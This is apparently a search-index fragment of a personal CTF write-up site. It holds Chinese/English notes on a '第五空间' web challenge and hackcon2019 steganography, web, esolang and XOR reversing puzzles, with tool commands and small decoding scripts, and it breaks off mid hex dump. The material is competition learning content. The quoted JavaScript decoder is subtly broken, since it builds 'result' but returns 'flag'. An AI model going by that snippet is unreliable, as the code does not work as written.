\u6709\u4e2alogin\u7684\u8def\u7531\u4f46\u662f\u88ab\u91cd\u5b9a\u5411\u5230\u4e86index.php \u65e2\u7136\u90fd\u544a\u8bc9\u4e86\u4f60username\u548cpassword\u603b\u5f97\u6709\u4e2a\u767b\u9646\u754c\u9762\u5427 \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u8def\u7531\uff1a \u5c45\u7136\u662fapache\u7684\u521a\u5b89\u88c5\u7684\u65f6\u5019\u7684\u4e00\u4e2a\u7f51\u9875 \u5c1d\u8bd5\u76ee\u5f55\u904d\u5386\u6ca1\u6709\u6210\u529f \u516b\u82e6 \u00b6 \u626b\u76ee\u5f55\u4e5f\u6ca1\u53d1\u73b0\u4ec0\u4e48","title":"\u7b2c\u4e94\u7a7a\u95f4"},{"location":"writeup/fivespace/#_1","text":"","title":"\u7b2c\u4e94\u7a7a\u95f4"},{"location":"writeup/fivespace/#_2","text":"\u968f\u624b\u8f93\u5165\u4e00\u4e2aid=1\u63d0\u793a\u4e0d\u884c \u52a0\u4e00\u4e2a\u7b26\u53f7\u5f97\u5230\u8fd9\u4e9b \u6ca1\u6709token \u626b\u76ee\u5f55\u53d1\u73b0\u4e86\u767b\u9646\u754c\u9762 \u6709\u4e2alogin\u7684\u8def\u7531\u4f46\u662f\u88ab\u91cd\u5b9a\u5411\u5230\u4e86index.php \u65e2\u7136\u90fd\u544a\u8bc9\u4e86\u4f60username\u548cpassword\u603b\u5f97\u6709\u4e2a\u767b\u9646\u754c\u9762\u5427 \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u8def\u7531\uff1a \u5c45\u7136\u662fapache\u7684\u521a\u5b89\u88c5\u7684\u65f6\u5019\u7684\u4e00\u4e2a\u7f51\u9875 \u5c1d\u8bd5\u76ee\u5f55\u904d\u5386\u6ca1\u6709\u6210\u529f","title":"\u7a7a\u76f8"},{"location":"writeup/fivespace/#_3","text":"\u626b\u76ee\u5f55\u4e5f\u6ca1\u53d1\u73b0\u4ec0\u4e48","title":"\u516b\u82e6"},{"location":"writeup/hackcon2019/","text":"hackcon2019 \u00b6 Small icon mush wow \u00b6 \u56fe\u7247: Given a file stego.jpg. Just like the title said, I try to extract the thumbnail picture and I got a QR Code. I try to decode it and I got the Flag. The command that I used to extract: exiftool -b -ThumbnailImage stego.jpg > my_thumbnail.jpg \u7136\u540e\u6211\u5c31\u53d1\u73b0\u4e86\u53e6\u4e00\u79cd\u89e3\u6cd5 binwalk \u662f\u53ef\u4ee5\u770b\u5230\u6709\u51e0\u4e2a\u56fe\u7247\u7684\uff0c\u4f46\u662f\u5374\u63d0\u53d6\u4e0d\u51fa\u6765\uff0c foremost \u8bd5\u4e86\u4e00\u4e0b\u4e5f\u884c\u4e0d\u901a\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u76f4\u63a5\u7528 dd \u5427 Too cold for steg \u00b6 Given a file final.txt . When I try to open it, the content is a Sherlock Holmes Novel. Based on the title Too Cold, I guess that this challenge will be related to stegsnow tools. In order to extract the hidden data, I need to find the password. I try to look it on the file and the password was store on there. The command to extract it: stegsnow -C -p \u201cd4rkc0de-IIITD\u201d final.txt \u540e\u6765\u624d\u5f97\u77e5\u8fd9\u662f\u4e00\u79cd\u6587\u672c\u9690\u5199\uff0c\u5c06\u4fe1\u606f\u9690\u85cf\u5728\u6587\u672c\u4e2d stegsnow -m \u6307\u5b9a\u8981\u9690\u85cf\u7684\u4fe1\u606f\uff0c source.txt \u662f\u539f\u6765\u7684\u6587\u4ef6\uff0c readme.txt \u662f\u9690\u85cf\u4e86\u4fe1\u606f\u7684\u6587\u4ef6 1 stegsnow -C -m 'We attack at dawn with Legos!' source.txt readme.txt \u63d0\u53d6\u4fe1\u606f 1 stegsnow -C readme.txt \u5c06\u6587\u4ef6\u9690\u85cf\u5230\u53e6\u4e00\u4e2a\u6587\u4ef6\u4e2d 1 stegsnow -C -f hidden_message.txt source.txt readme.txt \u63d0\u53d6\u6587\u4ef6 1 stegsnow -C readme.txt \u52a0\u5165\u5bc6\u7801\u4fdd\u62a4 1 stegsnow -C -p \"hello12345\" -f hidden_message.txt source.txt readme.txt \u89e3\u5bc6 1 stegsnow -C -p 'hello12345' readme.txt GIMP IT \u00b6 \u5c1d\u8bd5\u901a\u8fc7\u5199\u811a\u672c\u8f6c\u5316 1 2 3 4 5 6 7 8 9 10 11 f = open ( 'xcf.zip' , 'wb' ) a = \"504b 0304 1403 0000 0800 d005 d14e 2057 \\n 40de 7505 0000 c416 0200 0800 0000 6461 \\n 7461 2e74 7874 ecdd d16e 1331 1445 d15f \\n bafe ff9f 03aa 628a 844c 508e 0fa9 baf6 \\n a3a7 93eb acf4 6592 a633 9224 4992 2449 \\n 9224 4992 2449 9224 4992 2449 9224 497a \\n 8956 a4f9 4399 9f7b f4e8 ec32 3b3d 767e \\n 64e2 c489 0722 4e7c 1127 7e7d 5ae6 e788 \\n 1327 4e9c f8b9 c319 b173 57b8 09d7 30e8 \\n 4e5b e126 5cc3 a03b 6d85 9b70 0d83 eeb4 \\n 156e c235 0cba d356 b809 d730 e84e 5be1 \\n 265c c3a0 3b6d 859b 700d 83ee b415 6ec2 \\n 350c bad3 56b8 09d7 30e8 4e5b e126 5cc3 \\n 2073 9dfc e8b9 ffbe 8367 f672 ae61 409c \\n 38f1 e434 e2c4 8913 cf4e 234e 9c38 f1ec \\n 34e2 af2f 7e7e bc7b afdb 3d03 e2c4 8927 \\n a711 1fe2 c489 47a7 111f e2c4 8947 a711 \\n 9f97 127f f4f5 c81c 7595 4ffc c634 e243 \\n 9c38 f1e8 34e2 439c 38f1 e834 e243 fc13 \\n 887f 2872 559e f974 3833 a361 903e 8338 \\n 71e2 cf4b 1227 9e3b 373d 2d23 499c 78ee \\n dcf4 b48c 2471 e2b9 73d3 d332 925f 43fc \\n 5c46 e3d5 d7fe 52e4 7bbd 2b52 fa99 ffaf \\n b553 c46f ac9d 227e 63ed 14f1 1b6b a788 \\n df58 3b45 fcc6 da29 e237 d64e 11bf b176 \\n 8af8 8db5 5329 f174 99bf 70ce 7cb2 3c5f \\n 22e2 ed88 b723 de8e 783b e2ed 88b7 23de \\n 8e78 3be2 29a1 7b57 b86b 97fe 74f8 dedd \\n 69e6 5866 a78d 1d10 df95 7640 7c57 da01 \\n f15d 6907 c477 a51d 10df 9576 407c 57da \\n 01f1 5d69 07c4 77a5 1d10 4f4d 5bbb cc7f \\n 59ca ecb4 3183 787b 06f1 f60c e2ed 19c4 \\n db33 88b7 6710 6fcf 20de 9e41 bc3d 8378 \\n 7bc6 f702 df05 cdcc 4d7f 769c f1cb fc1e \\n 7c8c f8fb 21e2 4f1f 253e c4df 22fe 7e88 \\n f8d3 4789 0ff1 b788 bf1f 22fe f451 e243 \\n fcb7 32f7 1e4d bf57 9079 3720 7d8f 9bc6 \\n 553e 71e2 c489 1327 4e7c 8638 71e2 c433 \\n cfe3 67c4 5f4d 3c73 b59d b99e 9e49 bccf \\n 9079 af20 734f 9a5f 1127 fe23 e2c4 8913 \\n ffc6 debd 6437 0a04 0110 bc52 73ff cb8d \\n b540 c67e 33e3 05d9 e55f e4da aa46 216f \\n 10d0 22de d4bc 23e2 d788 137f 449c 7827 \\n beef 974e 9b67 73f7 e95e 4ace fcd7 33e2 \\n c43f 8838 71e2 c489 1327 4e9c f833 e2c7 \\n af11 af77 4a6a deef bed5 ea79 67c4 a7e6 \\n 9d11 9f9a 7746 7c6a de19 f1a9 7967 c4a7 \\n e69d 119f 9a77 467c 6ade 19f1 a979 67c4 \\n a7e6 bd29 7d6e 76dd a8b9 4fba f976 61df \\n 7f62 2359 af46 9c38 71e2 ed6a c489 1327 \\n deae 469c 38f1 9f2f 5e3f 19bb ef48 1bc9 \\n b576 ddc7 4d9c f83f 234e 9cf8 ed35 9abf \\n 234e 9c38 71e2 7f8d 38f1 21f1 d9fb 86f7 \\n 9dc7 3777 60d7 67fe c489 1327 4e9c 3871 \\n e2f7 5fd1 5835 5388 1327 4ebc 38eb 6df6 \\n 653a 929a 4fa6 d678 469c f8ed 883f 22fe \\n 8c38 f1db 117f 44fc 1971 e2b7 23fe 88f8 \\n b5e2 7aed ecf7 07cd be51 cd95 e523 d120 \\n 4e7c 11bf bd06 71e2 c489 1327 4e9c 38f1 \\n ef27 3e71 85b7 596d ad62 0fa6 faee e8ff \\n 479c 3871 e2c4 8913 ef22 4e9c 38f1 36e2 \\n 33e2 fbce 899b 2bd0 cd31 37bf 6fda ec23 \\n 4c9c f822 4e9c 3871 e2c4 893f 227e fbbd \\n 1127 fefd c56b e746 68df f702 fb9c ebd7 \\n 12bf d6ac 4b9c 3871 e267 cdba c489 1327 \\n 7ed6 ac4b 9cf8 4f17 afef 667e df8e 7da3 \\n 9adf c2a9 af36 1327 4e9c 3871 e2c4 df57 \\n 4812 274e 9cf8 6b85 24f1 9de2 fb7e 93a6 \\n 596d 6272 a34b 9cf8 224e 9c38 71e2 1f45 \\n 9cf8 edd5 2626 1327 4efc ab34 714d b871 \\n 5e2f ddbf cbfb f33f 19e2 d311 9f8e f874 \\n c4a7 233e 1df1 e988 4f47 7c3a e22f 7dfa \\n f5df d79a 3d79 ebb3 f7e6 337a 463c 9bb7 \\n 928e 24e2 9788 67f3 56d2 9144 fc12 f16c \\n de4a 3a92 885f 229e cd5b 4947 12f1 4bc4 \\n b379 2ba9 7e16 b479 aab6 b973 b9d9 a1a9 \\n b627 4e9c 3871 e2c4 89bf 8d38 71e2 c489 \\n ff36 f17d 67c7 cd0e 48fb 9eaf 7d54 3ecd \\n 4b9c 7877 ccc4 8913 27de 1e33 71e2 c489 \\n b7c7 4c9c f89f f6ed 1887 4118 88a2 e095 \\n 9cfb 5f2e 0d12 4189 94c2 cf80 c4fc 1ab3 \\n ec6c 055a ee21 ded4 6da6 507f 0318 5b88 \\n 139f af4b 9c38 71e2 6d5d e2c4 8913 6feb \\n 1227 7e37 f146 add9 93ae dfcf 7f84 38f1 \\n e98e 8813 3f84 38f1 e98e 8813 3f84 38f1 \\n e98e 8813 ffc8 d2bb 34cf 5c4f b599 dbeb \\n d46d e62d 0bce 1227 4e9c 787b 9638 71e2 \\n c4db b3c4 8913 7f92 f8bf 5cf3 87ea bacd \\n e5e6 baf1 15e2 c489 1721 be87 3871 e245 \\n 88ef 214e 9c78 11e2 63bc 0150 4b01 023f \\n 0314 0300 0008 00d0 05d1 4e20 5740 de75 \\n 0500 00c4 1602 0008 0000 0000 0000 0000 \\n 0020 80b4 8100 0000 0064 6174 612e 7478 \\n 7450 4b05 0600 0000 0001 0001 0036 0000 \\n 009b 0500 0000 00\" b = a . split ( ' \\n ' ) for i in range ( len ( b )): n = b [ i ] . encode ( 'utf-8' ) f . write ( n ) f . close () \u4f46\u662f\u8fd9\u6bb5\u811a\u672c\u6ca1\u6709\u6210\u529f\u3002\u3002 When I see the first line of that hex text that I found, I realize that it is a zip file (based on the header). I copy that hex and save it as a zip file . I unzip it and I got a file called data.txt which contains binary file. When I convert it into an ASCII String, it turns into gibberish text. After spending a long time trying to figure out that binary, turns out it is a QR Code. After I convert it into a QR Code, the decoded QR is the flag. web \u00b6 Given a web http://68.183.158.95/secret_agent/ that show a string Should d4rkc0de make their own browser . It is a classic challenge, we just need to change the user-agent to that string. Jorge Luis Borges \u00b6 \u663e\u7136\u90a3\u4e2a\u662fBrainFuck \u5f97\u5230 First, we decode the description with Brainfuck deobfuscator, we have a equation: x 4-314x 3+2771x^2-7954x+7320=0 Solve it!!! x=2, x=3, x=4, x=305 \u7b2c\u4e00\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u662f\u8fd9\u6837\u5b50\u7684\uff1a 1 33 68 64 68 6a 32 69 6e 6f 35 ..... \u663e\u7136\u662fASCII\u7801\uff0c\u8f6c\u4e00\u4e0b\u5f97\u5230 1 3hdhj2ino5cs711ip1jl8kl816gz0it3fzz6hzuo4lkk0as7xitwr3he6oopwsv7voci3i4tepb22sqltf0ed7814zahhag1cit4kd8zxfnyrz2okh07l4z6k87941pcjnemlnyq3rfp1qfbam6mi6h7a9x3b1m24to0jv66cuayb7jx0nvfwkhhwyz7m6fv99rplkile9ngdr0hv49xb74clrheoqowkd8a9sbgl5ia4k3bucrxax1ydxu6louv42iphyd01znbz004sgw8rgqu148se864xvwk9z2smvikys308v242njv8yg52o96sig0hf34q33dd157x5veulwbyvqrzf1hbywk8itwx14j0bdksigmx18ngi79gdgk1t65lqpyk9ngz3zxn6pa5j0ys7144cfqkew98s9nprasm3xfi6nkpliinklxgtgkj0ym1ecw0rfiph62futxqmfb9qseqpasg2bel91efisdtjftsrlutdtb9hkzx81lxa92s9g8fysczabqy3oal9iwq3c2761m1rwp41msqfk8tis1rhgwa31z6fe3yj4gmvsxlw1wrhyb1f7g5cf02syf8ji721d1pcu9yux8sdk3zukhobvs3axkuc9qfvgu34eq2wn5xbt6eha05tugff5v0aingolwz7170vxhvtscqbt5nu1pl8j18dtk77rlvpbsmoxi0v0ah1o1b8afamhs82n4x2vbdsoxmm36ps1cf34dqljgfsga2fozoefde36mtuvg9urd5fohu97hu1gu8xllcxta5zcqmkbz3ovpuv5f8oe2c09sfhk0w1yvlxdnh7ywra9lon125q7f5v9fyppfnun9j0zgtj7i9cmt5ykgsdbr9hil9f5b2ettg29quvb02da3xl5tvie5ky9kwb1bxu4bxku5j82j9upyenach78zq0b8htp3wmdf87yo6wmm1tpfoxbu4oa3js8mjnvu209rf0o64wek2135pvbobu378bjz0w3rq9umxfxtj2v69tjwkdux0n2wpzkgopzmgcdvvb6wv4y8g6f0u12xbwcepot5lm55sm2o5c5r5gb329xvauknvkq0udkvou9lv75jurxa64k208u93e68fk8n3q6qs66fofowfwqjidn11v3febxqu77jnj4923rnnkrvutcr625l8e5z330marrt5benok542p19qob6cxzasy8m3q4sx4wszzun956ucfwm1qqo62660dgqmo8t7y2gj3ylkgap7gr3gfwtkkeqhwenqrywpg8it6clj744c3lylkzqh89h55105izp3jz6jr2ft5e6d7abinisdedkt6i6fh77s57w96hgb86rbv43u4w8tymm29syjlem27c7hf4yabouq68s4zzb9hm9cla5i0ymf8rz3fctei4bofdolbriyhl9adl9eva393d7kla5blzqr7hmz3p1p80a9akvvduumov70xchc0jbctwq52ju8t6ieeuseqdroi3zkjw7pj6ivtjr2cei262gldr4abor694m5iubmhueyg2pxrjuj1h9tqfytc1uzk23aru3bmpgblo4l4l4kf5ivwcp67nhy9mgeisu571fult6wkuvlbywuzaheuxml7m4u1yjqw6g0u6xld1yzg5qisf7j5bz569kajvh6stlqmcs0la1wnri9sg9m3diu7br88wlsb6dg17z9zuw63ej54c24sxnduhirh7p4ltromy26ra3edsiiwj4gkkxa5zxrv7bploeskujv549q6g69eo8f0guopfr9h98xkeeoeow69x8gokutl8m0swoa2u4oq9a0okmtpl0c6j3rumsqyv7lr8dw1wf85th7uz8vjy1ovitw9woshu4tdhaa4ur3dpa79r7qttq2000z2rmacgj63bw5gdgnjj9tb3b7z72zu0hvbr61z0tw3upk7sn162r0wmqnifxr2tr7fd0mhyp79xvu64amxwvqes6e5wwa4phj1myw4yfcn7vfos13z3urmsyncggtkubs8ifriqb7frm6wajwu9wizpkfdrn6hob92322t63fi7on7xenllys6n76tx4e7mw880an07ij95g3ghyd8dbebcrfdkl1tb58owhta5qhzwekxqmn3tok8sv83kumztyamkeph0lw0cvvs6yamxynngy4vr3j7582m614tep2lfahgoubzzos3rloyedlbfy00x0n38jziysdkdgji1uxzyhnst931dqgz7w6d9g1wyia0rki1zzit58soj5vbx5xrbwwvw0ek0c6y8gujx3xvajjqcsl5t7sesjfb0tr8p7flp8fzpokzl42s0b86gh6ggnsymguzeeivwzhjz096wj3p8kl46izj35d2w4hlbx5fkleltl2ghdttx4698blgd4wbux04svz1e9649dzhja2s01kyl5opmy1wxsiypv1lc64s6oeee6e41s1enbijtbj19funhpmsmzsqpzpkqplimuycuhsz6ljdvhk3e3o6ml7ezckw2x4ry4pyxqw4lji1agq0wj7n7a1xwz78erzz831jciq866su6puq5h9omsf7oa8l18ix7l4lw6iry2o612lkgd83meqlun3rd6wej821e8noktby8nhoy6e97jkcv52haiahe4tpdzh0pprnjwm203yumiadjzwvvrkqyxdzyx9pnook6s9xwf0fjiwxsjff6w0fgpdhv5glqd2ienn1h475i45df8j8wja8jpotloji3mdwdt8m8qmtyjxzrcmcxkvw2negz1hda7j2xb6u3vhhnq2xt89clygemmj1eosg6n6px360hngiq94sk6xqz1hr02lpombgrh84be0w5zr3sgv4n6wo7d59tddl6ycwk19c7r5ebqc71z1p00odk34dsyah3bb96npl05d6yhdicz8yv4eaauu1j4h57ia8yvm5r1drxz5zfbpx81zys2l9babdz4w6mopvthslhffjxjhj7wor7dyxxstn62gb4rellqyv3890c7uutqhj9yuwgxr6l9mcvqe2wd74fue5pp0e5dnzo0s70lknmuy0qmpg1o1rus1kybfu5vcwax7omsm6xk621ddwfn9tatwbc1slsgh7139ufgnjwdbx9acqewaf2lkdglakng82etn9xfupzvo9fvvibt28m8am0iiwdoyvs2fkypcdose7a3gs2kwkd4ua1wjf \u7136\u540e\u770b\u7b2c\u4e8c\u4e2a\u6587\u4ef6 1 2 3 4 5 6 x = 0, y = 0, rule = B3/S23 3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob 3ob3ob3ob3ob3ob3ob3ob3ob3o$obobobobobobobobobobobobobobobobobobobobobo bobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobo bobobobobob3o$obobobobobobobobobobobobobobobobobobobobobobobobobobobob obobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobob3o x = 0, y =0, rule = B3/S23 ? We Google it and found some interesting results : RLE file format , Conway's Game of Life . Okay, we tried with all part with \"!\" present. With a final part, import to this , we get a result \u53c8\u662f\u4e00\u79cd\u795e\u5947\u7684\u7f16\u7801 Run Length Encoded Run Length Encoded The first line is a header line, which has the form 1 x = m, y = n x = 0, y =0, rule = B3/S23 ? We Google it and found some interesting results : RLE file format , Conway's Game of Life . Okay, we tried with all part with \"!\" present. With a final part, import to this , we get a result 1 2 3 4 x = 0, y = 0, rule = B3/S23 10$obo5b3obob3obob ob$obob3obo7bobobobobob3o$bo2b3ob3obo2bo2b3ob3o$bo2b3obo3bobo3b3ob3ob3o $bo2bobobo3bob3obobob3o$! \"YmFiZWw= \" (base64) -> babel Okay, Google again. The name of challenge \"Jorge Luis Borges\", \"book\", \"babel\". And then, we get the book with a website https://libraryofbabel.info hex name: strings from file1 wall : 2 shelf : 3 volume: 4 page: 305 \u8fd9\u8111\u6d1e\u6709\u70b9\u5927\u554a\u3002 Invisible Programming \u00b6 \u5f97\u5230\u4e00\u4e2aCPP\u6587\u4ef6 1 2 3 4 5 6 7 #include <iostream> using namespace std ; int main () { cout << \"The flag is d4rk{You_thought_this_will_be that_much_easy}c0de \\n \" ; return 0 ; } \u5f88\u5947\u602a\uff0c\u4e8e\u662f\u3002\u3002 After googling a bit, it seems to resemble WhiteSpace esolang. Trying to execute it throws some syntax errors, so I quickly gave up on that. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import re h = open ( 'hello_world.cpp' ) lines = [ x [: - 1 ] for x in h . readlines () ] # remove newline char h . close () flag = [] for line in lines : num = '' . join ( re . findall ( r '\\s+' , line )) . replace ( ' \\t ' , '1' ) . replace ( ' ' , '0' ) if num : try : flag . append ( chr ( int ( num , 2 ))) except : pass print ( '' . join ( flag )) \u76ee\u524d\u5bf9\u4e8epython\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u8fd8\u4e0d\u662f\u5f88\u719f\u6089\u4e3b\u8981\u662f\u90a3\u4e2a join(re.findall(r'\\s+', line)).replace('\\t','1').replace(' ','0') \u6b64\u65f6\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u4f46\u662f\u8fd8\u9700\u8981\u5bf9\u6587\u4ef6\u505a\u4e00\u4e9b\u4fee\u6539 \u4e00\u4e2a\u5e08\u5085\u5199\u7684js\u7248\u672c\uff1a 1 2 3 4 5 6 7 8 9 10 11 function decoder ( str ) { var flag = '' ; str . replace ( /.{7}/g , function ( strByte ) { var binStr = strByte . replace ( / /g , '0' ). replace ( / /g , '1' ); var charCode = parseInt ( binStr , 2 ); result += String . fromCharCode ( charCode ); }); return flag ; } SuperEncryptor | Reversing \u00b6 \u4e0d\u61c2\u56fd\u5916\u7684\u5206\u7c7b\uff1a \u5f97\u5230\u4e00\u4e2aenc\u8fd8\u4ee5\u4e3a\u662f\u6d41\u91cf\u5305\uff0c\u7ed3\u679c\u662f\u4e00\u6bb5\u5b57\u7b26\uff1a 1 d9a68b755a6e7be6aaa912105d749fb8ae33506e4adefeb0745e5c70cfa88c71 \u8fd9\u6837\u7684\u4e00\u4e2a\u7a0b\u5e8f \u8fd8\u662f\u770bwp\u5427 1 2 3 4 5 6 7 8 9 echo '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' | ./q3 _ _ __ __ _ _ __ _____ __ | \\ | | | \\/ (_) | \\ \\ / / _ \\/_ | | \\| | __ _ _ __ ___ | \\ / |_| |_ ___ ___ \\ \\ / / | | || | | . ` |/ _` | '_ \\ / _ \\| |\\/| | | __/ _ \\/ __| \\ \\/ /| | | || | | |\\ | (_| | | | | (_) | | | | | || __/\\__ \\ \\ / | |_| || | |_| \\_|\\__,_|_| |_|\\___/|_| |_|_|\\__\\___||___/ \\/ \\___(_)_| String to encrypt (Max 5000) : Encrypted : abcdef4123310abcdef4123310ab \u7136\u540e\u5c31\u83ab\u540d\u7684\u8ba4\u4e3a\u8fd9\u4e2a\u662f\u4ea6\u6216\u8fd0\u7b97\uff1f\uff1f\u4e0d\u8fc7\u4ed6\u8fd9\u662f\u600e\u4e48\u60f3\u51fa\u6765\u7684\u554a First thought that came to my mind was that it was an XOR operation with the key abcdef4123310 . When I XORed this key with the content of flag.enc, I got: 1 rkd4y_{MgFS3lt4uArs_Ju3_5}mpdec0 which looks like the shuffled version of the flag. Swapped two sides inside each 4-byte block, and got the flag: 1 d4rk{My_S3gF4ults_Ar3_Jump5}c0de \u8fd9\u6837\u5c31\u5f97\u5230flag\u4e86 GIFe_me_time | Forensics \u00b6 \u8fd9\u4e2a\u7c7b\u522b\u7684\u9898\u76ee\u4e5f\u662f\u7b2c\u4e00\u6b21\u89c1 \u8bbf\u95ee\u4e86\u8fd9\u6837\u4e00\u4e2a\u9875\u9762 \u53c2\u8003 \u00b6 https://medium.com/@Nicholaz99/hackcon2019-writeup-4639553b9355 https://ctftime.org/writeups https://hackcon.online/challenges#GIMP IT Github Invisible Programming","title":"hackcon2019"},{"location":"writeup/hackcon2019/#hackcon2019","text":"","title":"hackcon2019"},{"location":"writeup/hackcon2019/#small-icon-mush-wow","text":"\u56fe\u7247: Given a file stego.jpg. Just like the title said, I try to extract the thumbnail picture and I got a QR Code. I try to decode it and I got the Flag. The command that I used to extract: exiftool -b -ThumbnailImage stego.jpg > my_thumbnail.jpg \u7136\u540e\u6211\u5c31\u53d1\u73b0\u4e86\u53e6\u4e00\u79cd\u89e3\u6cd5 binwalk \u662f\u53ef\u4ee5\u770b\u5230\u6709\u51e0\u4e2a\u56fe\u7247\u7684\uff0c\u4f46\u662f\u5374\u63d0\u53d6\u4e0d\u51fa\u6765\uff0c foremost \u8bd5\u4e86\u4e00\u4e0b\u4e5f\u884c\u4e0d\u901a\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u76f4\u63a5\u7528 dd \u5427","title":"Small icon mush wow"},{"location":"writeup/hackcon2019/#too-cold-for-steg","text":"Given a file final.txt . When I try to open it, the content is a Sherlock Holmes Novel. Based on the title Too Cold, I guess that this challenge will be related to stegsnow tools. In order to extract the hidden data, I need to find the password. I try to look it on the file and the password was store on there. The command to extract it: stegsnow -C -p \u201cd4rkc0de-IIITD\u201d final.txt \u540e\u6765\u624d\u5f97\u77e5\u8fd9\u662f\u4e00\u79cd\u6587\u672c\u9690\u5199\uff0c\u5c06\u4fe1\u606f\u9690\u85cf\u5728\u6587\u672c\u4e2d stegsnow -m \u6307\u5b9a\u8981\u9690\u85cf\u7684\u4fe1\u606f\uff0c source.txt \u662f\u539f\u6765\u7684\u6587\u4ef6\uff0c readme.txt \u662f\u9690\u85cf\u4e86\u4fe1\u606f\u7684\u6587\u4ef6 1 stegsnow -C -m 'We attack at dawn with Legos!' source.txt readme.txt \u63d0\u53d6\u4fe1\u606f 1 stegsnow -C readme.txt \u5c06\u6587\u4ef6\u9690\u85cf\u5230\u53e6\u4e00\u4e2a\u6587\u4ef6\u4e2d 1 stegsnow -C -f hidden_message.txt source.txt readme.txt \u63d0\u53d6\u6587\u4ef6 1 stegsnow -C readme.txt \u52a0\u5165\u5bc6\u7801\u4fdd\u62a4 1 stegsnow -C -p \"hello12345\" -f hidden_message.txt source.txt readme.txt \u89e3\u5bc6 1 stegsnow -C -p 'hello12345' readme.txt","title":"Too cold for steg"},{"location":"writeup/hackcon2019/#gimp-it","text":"\u5c1d\u8bd5\u901a\u8fc7\u5199\u811a\u672c\u8f6c\u5316 1 2 3 4 5 6 7 8 9 10 11 f = open ( 'xcf.zip' , 'wb' ) a = \"504b 0304 1403 0000 0800 d005 d14e 2057 \\n 40de 7505 0000 c416 0200 0800 0000 6461 \\n 7461 2e74 7874 ecdd d16e 1331 1445 d15f \\n bafe ff9f 03aa 628a 844c 508e 0fa9 baf6 \\n a3a7 93eb acf4 6592 a633 9224 4992 2449 \\n 9224 4992 2449 9224 4992 2449 9224 497a \\n 8956 a4f9 4399 9f7b f4e8 ec32 3b3d 767e \\n 64e2 c489 0722 4e7c 1127 7e7d 5ae6 e788 \\n 1327 4e9c f8b9 c319 b173 57b8 09d7 30e8 \\n 4e5b e126 5cc3 a03b 6d85 9b70 0d83 eeb4 \\n 156e c235 0cba d356 b809 d730 e84e 5be1 \\n 265c c3a0 3b6d 859b 700d 83ee b415 6ec2 \\n 350c bad3 56b8 09d7 30e8 4e5b e126 5cc3 \\n 2073 9dfc e8b9 ffbe 8367 f672 ae61 409c \\n 38f1 e434 e2c4 8913 cf4e 234e 9c38 f1ec \\n 34e2 af2f 7e7e bc7b afdb 3d03 e2c4 8927 \\n a711 1fe2 c489 47a7 111f e2c4 8947 a711 \\n 9f97 127f f4f5 c81c 7595 4ffc c634 e243 \\n 9c38 f1e8 34e2 439c 38f1 e834 e243 fc13 \\n 887f 2872 559e f974 3833 a361 903e 8338 \\n 71e2 cf4b 1227 9e3b 373d 2d23 499c 78ee \\n dcf4 b48c 2471 e2b9 73d3 d332 925f 43fc \\n 5c46 e3d5 d7fe 52e4 7bbd 2b52 fa99 ffaf \\n b553 c46f ac9d 227e 63ed 14f1 1b6b a788 \\n df58 3b45 fcc6 da29 e237 d64e 11bf b176 \\n 8af8 8db5 5329 f174 99bf 70ce 7cb2 3c5f \\n 22e2 ed88 b723 de8e 783b e2ed 88b7 23de \\n 8e78 3be2 29a1 7b57 b86b 97fe 74f8 dedd \\n 69e6 5866 a78d 1d10 df95 7640 7c57 da01 \\n f15d 6907 c477 a51d 10df 9576 407c 57da \\n 01f1 5d69 07c4 77a5 1d10 4f4d 5bbb cc7f \\n 59ca ecb4 3183 787b 06f1 f60c e2ed 19c4 \\n db33 88b7 6710 6fcf 20de 9e41 bc3d 8378 \\n 7bc6 f702 df05 cdcc 4d7f 769c f1cb fc1e \\n 7c8c f8fb 21e2 4f1f 253e c4df 22fe 7e88 \\n f8d3 4789 0ff1 b788 bf1f 22fe f451 e243 \\n fcb7 32f7 1e4d bf57 9079 3720 7d8f 9bc6 \\n 553e 71e2 c489 1327 4e7c 8638 71e2 c433 \\n cfe3 67c4 5f4d 3c73 b59d b99e 9e49 bccf \\n 9079 af20 734f 9a5f 1127 fe23 e2c4 8913 \\n ffc6 debd 6437 0a04 0110 bc52 73ff cb8d \\n b540 c67e 33e3 05d9 e55f e4da aa46 216f \\n 10d0 22de d4bc 23e2 d788 137f 449c 7827 \\n beef 974e 9b67 73f7 e95e 4ace fcd7 33e2 \\n c43f 8838 71e2 c489 1327 4e9c f833 e2c7 \\n af11 af77 4a6a deef bed5 ea79 67c4 a7e6 \\n 9d11 9f9a 7746 7c6a de19 f1a9 7967 c4a7 \\n e69d 119f 9a77 467c 6ade 19f1 a979 67c4 \\n a7e6 bd29 7d6e 76dd a8b9 4fba f976 61df \\n 7f62 2359 af46 9c38 71e2 ed6a c489 1327 \\n deae 469c 38f1 9f2f 5e3f 19bb ef48 1bc9 \\n b576 ddc7 4d9c f83f 234e 9cf8 ed35 9abf \\n 234e 9c38 71e2 7f8d 38f1 21f1 d9fb 86f7 \\n 9dc7 3777 60d7 67fe c489 1327 4e9c 3871 \\n e2f7 5fd1 5835 5388 1327 4ebc 38eb 6df6 \\n 653a 929a 4fa6 d678 469c f8ed 883f 22fe \\n 8c38 f1db 117f 44fc 1971 e2b7 23fe 88f8 \\n b5e2 7aed ecf7 07cd be51 cd95 e523 d120 \\n 4e7c 11bf bd06 71e2 c489 1327 4e9c 38f1 \\n ef27 3e71 85b7 596d ad62 0fa6 faee e8ff \\n 479c 3871 e2c4 8913 ef22 4e9c 38f1 36e2 \\n 33e2 fbce 899b 2bd0 cd31 37bf 6fda ec23 \\n 4c9c f822 4e9c 3871 e2c4 893f 227e fbbd \\n 1127 fefd c56b e746 68df f702 fb9c ebd7 \\n 12bf d6ac 4b9c 3871 e267 cdba c489 1327 \\n 7ed6 ac4b 9cf8 4f17 afef 667e df8e 7da3 \\n 9adf c2a9 af36 1327 4e9c 3871 e2c4 df57 \\n 4812 274e 9cf8 6b85 24f1 9de2 fb7e 